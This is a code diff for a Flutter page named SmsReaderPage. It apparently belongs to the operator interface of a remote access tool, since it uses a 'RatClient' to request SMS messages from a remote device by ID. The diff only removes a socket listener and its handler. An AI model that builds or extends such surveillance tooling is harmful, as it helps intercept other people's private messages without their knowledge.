@@ -1,5 +1,3 @@
-import 'dart:async';
-
 import 'package:flutter/material.dart';
 
 import 'rat_client.dart';
@@ -26,8 +24,6 @@ class _SmsReaderPageState extends State<SmsReaderPage> {
   final ScrollController _scrollCtrl = ScrollController();
   final Set<int> _expanded = {};
 
-  late final StreamSubscription<void> _sub;
-
   RatClient get client => widget.client;
   String get deviceId => widget.deviceId;
 
@@ -51,13 +47,11 @@ class _SmsReaderPageState extends State<SmsReaderPage> {
   void initState() {
     super.initState();
     client.addListener(_onClientData);
-    _sub = client.socket!.on('sms:list', _onSmsList);
     _requestSms();
   }
 
   @override
   void dispose() {
-    _sub.cancel();
     client.removeListener(_onClientData);
     _searchCtrl.dispose();
     _scrollCtrl.dispose();
@@ -66,17 +60,6 @@ class _SmsReaderPageState extends State<SmsReaderPage> {
 
   void _onClientData() {
     if (mounted) setState(() {});
-  }
-
-  void _onSmsList(dynamic data) {
-    if (!mounted) return;
-    if (data is Map && data['deviceId']?.toString() == deviceId) {
-      final list = data['messages'];
-      if (list is List) {
-        final parsed = list.whereType<Map>().toList();
-        if (parsed.isNotEmpty && mounted) setState(() {});
-      }
-    }
   }
 
   void _requestSms() {
